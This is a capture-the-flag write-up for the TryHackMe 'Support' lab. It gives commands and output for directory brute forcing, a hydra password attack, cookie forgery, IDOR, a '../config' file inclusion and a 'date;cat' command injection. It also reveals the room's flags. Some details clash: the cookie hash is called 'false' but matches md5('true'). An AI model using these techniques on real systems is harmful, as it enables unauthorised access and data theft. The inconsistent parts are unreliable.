# [TryHackMe | Support](https://tryhackme.com/room/support) Challenge Room Solution Writeup

### What is the flag value after logging in as admin?

Use `gobuster` to map out the directory structure of the target website. 

```bash
gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -r -x html,php,txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 2591]
/info.php             (Status: 200) [Size: 73282]
/footer.php           (Status: 200) [Size: 1253]
/skins                (Status: 200) [Size: 1533]
/includes             (Status: 200) [Size: 1143]
/layout               (Status: 200) [Size: 953]
/js                   (Status: 200) [Size: 957]
/api.php              (Status: 200) [Size: 2591]
/logout.php           (Status: 200) [Size: 2591]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 200) [Size: 2591]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 277]
Progress: 5095332 / 5095336 (100.00%)
===============================================================
Finished
===============================================================
```

Note `http://TARGET_IP/skins` and `http://TARGET_IP/config.php` for later. For now, investigate `http://TARGET_IP/index.php`. View the page source to reveal a POST request with `email` and `password` fields in the request body as well as a default email of `help@support.thm`.

```html
<form method="POST">
    <div class="mb-3">
        <label class="form-label">Corporate Email</label>
        <input type="email" name="email" class="form-control" placeholder="help@support.thm" required>
    </div>

    <div class="mb-4">
        <label class="form-label">Password</label>
        <input type="password" name="password" class="form-control" required>
    </div>

    <button class="btn btn-primary w-100">Sign In</button>
</form>
```

Use `hydra` on the `help@support.thm` email with the `rockyou.txt` password list and `Invalid credentials` response found from a login attempt with invalid credentials to discover `password=snoopy` via brute force.

```bash
hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid credentials" -f

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-08 01:10:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://TARGET_IP:80/index.php:email=^USER^&password=^PASS^:Invalid credentials
[80][http-post-form] host: TARGET_IP   login: help@support.thm   password: snoopy
[STATUS] attack finished for TARGET_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-08 01:10:14
```

Use `email=help@support.thm` and `password=snoopy` to log in via `http://TARGET_IP/index.php`. Inspect the page then check `Storage > Cookies` to find two cookies with hashed `isITUser` and `PHPSESSID` values. 

```bash
isITUser:"b326b5062b2f0e69046810717534cb09"
Created:"Thu, 08 Oct 2026 01:14:31 GMT"
Domain:"TARGET_IP"
Expires / Max-Age:"Thu, 08 Oct 2026 02:11:50 GMT"
HostOnly:true
HttpOnly:false
Last Accessed:"Thu, 08 Oct 2026 01:16:39 GMT"
Path:"/"
SameSite:""
Secure:false
Size:40
Updated:"Thu, 08 Oct 2026 01:16:39 GMT"

PHPSESSID:"50va11trv7sv0be4f36sd116m1"
Created:"Thu, 08 Oct 2026 00:19:14 GMT"
Domain:"TARGET_IP"
Expires / Max-Age:"Session"
HostOnly:true
HttpOnly:false
Last Accessed:"Thu, 08 Oct 2026 01:16:40 GMT"
Path:"/"
SameSite:""
Secure:false
Size:35
Updated:"Thu, 08 Oct 2026 00:19:14 GMT"
```

Use [CrackStation](https://crackstation.net/) to attempt to decode both hashed values. `isITUser:"b326b5062b2f0e69046810717534cb09"` decodes via `MD5` as `false`, while `PHPSESSID` remains uncracked. Try encoding `true` via `MD5` and replacing the `isITUser` value in `Storage > Cookies`.

```bash
echo -n "true" | md5sum
b326b5062b2f0e69046810717534cb09  -
```

Refreshing the page reveals an IT Admin Panel. Clicking the `View API` button redirects to `http://TARGET_IP/api.php`, revealing a potential IDOR vulnerability of the form `http://TARGET_IP/api.php?id=1`. Iterate through `http://TARGET_IP/api.php?id=x` for `x=[1,3]` to discover `email=specialadmin@support.thm` for the admin.

```yaml
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}

{
    "email": "IT@support.thm",
    "2FA": false,
    "admin": false
}

{
    "email": "help@support.thm",
    "2FA": false,
    "admin": false
}
```

Recall `http://TARGET_IP/skins` and `http://TARGET_IP/config.php`. The former contains `PHP` files that are loaded from the `Select Theme` button in the bottom-right of the webpage, resulting in another potential IDOR vulnerability of the form `http://TARGET_IP/dashboard.php?skin=default`. View the page source to reveal the button code.

```html
<div class="dropdown">
    <button class="btn btn-outline-secondary dropdown-toggle"
            type="button"
            data-bs-toggle="dropdown">
        Select Theme
    </button>

    <ul class="dropdown-menu dropdown-menu-end">
        <li><a class="dropdown-item" href="?skin=default">Default</a></li>
        <li><a class="dropdown-item text-danger" href="?skin=red">Red</a></li>
        <li><a class="dropdown-item text-success" href="?skin=green">Green</a></li>
        <li><a class="dropdown-item text-primary" href="?skin=blue">Blue</a></li>
    </ul>
</div>
```

These relate to the `.php` files stored at `http://TARGET_IP/skins`.

```http
Index of /skins
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	blue.php	2026-01-20 08:16 	56 	 
[ ]	default.php	2026-01-20 08:15 	56 	 
[ ]	green.php	2026-01-20 08:15 	56 	 
[ ]	red.php	2026-01-20 08:15 	56 	 
Apache/2.4.58 (Ubuntu) Server at TARGET_IP Port 80
```

Noting that `.php` is stripped from the value, try loading `config.php` via `http://TARGET_IP/dashboard.php?skin=../config`, then view the page source to reveal `$MASTER_PASSWORD = 'support@110'`. 

```http
<?php

$MASTER_PASSWORD = 'support@110';

$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

Use `email=specialadmin@support.thm` and `password=support110` (note the absence of the `@`) to log in via `http://TARGET_IP/index.php` as the admin. Upon logging in successfully, you will get see the flag **THM{I_AM_ADMIN999}**.

### What is the content of the file /home/ubuntu/user.txt?

The admin dashboard has a new `Date/Time` button in the bottom-right of the webpage. View the page source to reveal a potential path traversal vulnerability.

```html
<form method="POST" id="sysForm">
    <select name="sys"
            class="form-select"
            onchange="document.getElementById('sysForm').submit();">

        <option value="date"
            selected>
            Date
        </option>

        <option value='date +"%H:%M:%S"'
            >
            Time
        </option>
    </select>
</form>
```

Use `BURP Suite`'s `Proxy` and `Repeater` tools to capture this `POST` request then edit the `sys` field in the request body using `;` to append `cat /home/ubuntu/user.txt`.

```http
POST /dashboard.php HTTP/1.1
Host: TARGET_IP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://TARGET_IP/dashboard.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://TARGET_IP
Connection: keep-alive
Cookie: PHPSESSID=50va11trv7sv0be4f36sd116m1; isITUser=b326b5062b2f0e69046810717534cb09
Upgrade-Insecure-Requests: 1
Priority: u=0, i

sys=date;cat /home/ubuntu/user.txt
```

Sending this yields a response embedded with the flag **THM{GOT_THE_FLAG001}**.

```http
    <div class="container mt-3">
        
                    <div class="alert alert-dark">
                <pre class="mb-0">Thu Oct  8 02:06:10 UTC 2026
THM{GOT_THE_FLAG001}</pre>
            </div>
            </div>
```